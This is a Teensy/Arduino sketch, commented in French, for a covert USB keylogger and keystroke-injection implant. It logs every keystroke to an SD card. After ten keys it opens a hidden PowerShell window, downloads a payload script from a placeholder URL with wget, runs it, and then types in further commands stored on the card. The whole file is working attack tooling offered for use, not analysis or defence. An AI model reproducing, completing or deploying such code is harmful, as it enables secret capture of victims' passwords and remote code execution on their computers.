#include "USBHost_t36.h"
#include "SD.h"

// Définir les constantesL
#define LOG_FILENAME "log.txt" //nom du fichier log sur la carte sd
#define KEY_COUNT_LIMIT 10 // nombre de touche avant déclenchement
#define PAYLOAD_FILENAME "payload_sd.txt" //nom du fichier payload sur la carte sd
#define URL "votre_url_ici" //url pour télécharger le fichier payload


bool allowKeyWriting = true; // controle ecriture des touches
File dataLog;
USBHost myusb;
USBHub hub1(myusb);
KeyboardController keyboard1(myusb);
BluetoothController bluet(myusb);

USBHIDParser hid1(myusb);
USBHIDParser hid2(myusb);
USBHIDParser hid3(myusb);

// Ajoute un compteur pour les frappes de touches
int keyCount = 0;

void setup() {
  // Initialiser le port série
  Serial.begin(115200);
  while (!Serial) {}
  //Serial.println("-- START --");

  // Initialiser l'objet USB
  myusb.begin();

  // Configurer le clavier pour détecter les pressions
  keyboard1.attachPress(onKeyPress);

  // Vérifier si la carte SD est présente
  if (!SD.begin(BUILTIN_SDCARD)) {
    //Serial.println("Erreur d'initialisation de la carte SD.");
    while (1);
  }
  
  // Activer le clavier en mode HID 
  pinMode(0, INPUT_PULLUP);
  delay(1000);
  Keyboard.begin();
}

// Boucle principale 
void loop() {
  myusb.Task();
}

void onKeyPress(int unicode) {
  // Convertir unicode en caractère
  char keyChar = (char)unicode;

  // Enregistrez les frappes sur la carte SD
  File logFile = SD.open(LOG_FILENAME, FILE_WRITE);
  if (logFile) {
    logFile.write(keyChar);
    logFile.close();
  } else {
    //Serial.println("Erreur d'ouverture du fichier log.txt");
  }

  // Afficher la touche appuyée sur le moniteur série
  //Serial.write(keyChar);

  // Envoyer la touche appuyée en mode HID
  if (allowKeyWriting) {
    Keyboard.write(keyChar);
  }

    // Augmenter le compteur de touches
  keyCount++;

  // Si le compteur atteint la limite
  if (keyCount >= KEY_COUNT_LIMIT) {
    allowKeyWriting = false;

    // Ouvrir le shell
    open();

    // Envoyer la commande au shell pour télécharger le fichier payload
    Keyboard.print("-Command wget ");
    Keyboard.print(URL);
    Keyboard.print(" -OutFile payload_vps.ps1");
    delay(5000);

  //execute le fichier
    open();
    Keyboard.print("-File ");
    delay(200);
    Keyboard.println("payload_vps.ps1");
    delay(3000);


    // Exécuter le payload de la carte SD
    open();
    Keyboard.print("-Command ");
    delay(200);
    executePayload();

    // Réinitialiser le compteur
    keyCount = 0;
    allowKeyWriting = true;
  }
}

  void open(){
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(200);  // Attendre que la fenêtre Exécuter s'ouvre
    Keyboard.print("powershell.exe ");
    delay(200); 
    Keyboard.print(" -WindowStyle Hidden ");
    delay(200);
  }

  void executePayload() {
    File payloadFile = SD.open(PAYLOAD_FILENAME, FILE_READ);
    if (payloadFile) {
      while (payloadFile.available()) {
        // Lire une ligne à partir du fichier
        String line = payloadFile.readStringUntil(';');
        delay(500);

        // Envoyer la ligne au shell
        Keyboard.println(line);
        delay(1000);  // Attendre que la commande s'exécute
      }
      payloadFile.close();
    } else {
      //Serial.println("Erreur d'ouverture du fichier payload.txt");
    }
  }
